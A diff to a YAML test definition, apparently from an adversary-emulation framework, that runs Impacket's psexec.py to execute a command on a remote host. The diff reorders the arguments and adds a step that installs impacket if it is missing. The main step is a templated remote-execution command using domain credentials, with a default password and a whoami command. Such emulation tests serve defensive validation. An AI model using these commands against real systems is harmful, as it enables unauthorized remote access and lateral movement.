@@ -3,6 +3,9 @@ name: psexec.py (Impacket)
 description: |
     Will execute a command on the remote host with Impacket psexec.py script.
 args:
+    - name: command
+      type: string
+      default: whoami
     - name: remote_host
       type: string
       default: 127.0.0.1
@@ -14,9 +17,6 @@ args:
     - name: password
       type: string
       default: P@ssw0rd1
-    - name: command
-      type: string
-      default: whoami
 uuid: edbcd8c9-3639-4844-afad-455c91e95a35
 mitre:
     tactics:
@@ -29,6 +29,12 @@ requirements:
     platforms:
         - os: linux
 steps:
+    - name: |
+        psexec.py (Impacket)
+      inline: |
+        if [ -x "$(command -v psexec.py)" ]; then exit 0; else {sudo pip3 install impacket
+        }; fi;
+      executor: bash
     - name: psexec.py-(impacket)
       inline: |
         psexec.py '{{.Args.domain}}/{{.Args.username}}:{{.Args.password}}@{{.Args.remote_host}}' '{{.Args.command}}'
